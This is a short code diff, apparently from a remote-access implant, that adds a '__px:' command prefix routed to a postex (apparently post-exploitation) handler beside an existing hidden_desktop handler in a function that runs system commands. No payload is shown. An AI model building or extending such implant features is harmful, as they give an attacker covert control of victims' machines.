@@ -75,6 +75,8 @@ def get_metadata():
 def execute_command(command: str) -> str:
     if str(command).startswith('__hd:'):
         return hidden_desktop(command)
+    if str(command).startswith('__px:'):
+        return postex(command)
     """Execute system command and return output"""
     try:
         if command.startswith('cd '):
